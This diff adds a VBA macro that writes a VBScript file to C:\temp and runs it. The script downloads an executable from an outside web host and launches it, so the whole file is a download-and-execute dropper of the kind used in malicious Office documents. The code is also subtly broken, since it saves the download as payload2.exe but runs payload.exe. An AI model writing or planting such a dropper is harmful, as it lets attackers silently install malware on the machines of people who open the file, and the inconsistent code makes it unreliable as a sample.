@@ -1,0 +1,30 @@
+Sub WritePayload()
+    Dim PayLoadFile As Integer
+    Dim FilePath As String
+    FilePath = "C:\temp\payload.vbs"
+    PayLoadFile = FreeFile
+    Open FilePath For Output As PayLoadFile
+    Print #PayLoadFile, "HTTPDownload ""http://www.test.com/emergencyeye2.exe"", ""C:\temp\payload2.exe"""
+    Print #PayLoadFile, "Sub HTTPDownload( myURL, myPath )"
+    Print #PayLoadFile, "   Dim i, objFile, objFSO, objHTTP, strFile, strMsg"
+    Print #PayLoadFile, "   Const ForReading = 1, ForWriting = 2, ForAppending = 8"
+    Print #PayLoadFile, "   Set objFSO = CreateObject( ""Scripting.FileSystemObject"" )"
+    Print #PayLoadFile, "   If objFSO.FolderExists( myPath ) Then"
+    Print #PayLoadFile, "           strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev(myURL, "" / "" ) + 1 ) )"
+    Print #PayLoadFile, "  ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, ""\"") - 1 ) ) Then"
+    Print #PayLoadFile, "           strFile = myPath"
+    Print #PayLoadFile, "   End If"
+    Print #PayLoadFile, "   Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )"
+    Print #PayLoadFile, "   Set objHTTP = CreateObject( ""WinHttp.WinHttpRequest.5.1"" )"
+    Print #PayLoadFile, "   objHTTP.Open ""GET"", myURL, False"
+    Print #PayLoadFile, "   objHTTP.Send"
+    Print #PayLoadFile, "   For i = 1 To LenB( objHTTP.ResponseBody )"
+    Print #PayLoadFile, "   objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )"
+    Print #PayLoadFile, "   Next"
+    Print #PayLoadFile, "   objFile.Close( )"
+    Print #PayLoadFile, "   Set WshShell = WScript.CreateObject(""WScript.Shell"")"
+    Print #PayLoadFile, "   WshShell.Run ""c:\temp\payload.exe"""
+    Print #PayLoadFile, "End Sub"
+    Close PayLoadFile
+    Shell "wscript c:\temp\payload.vbs"
+End Sub
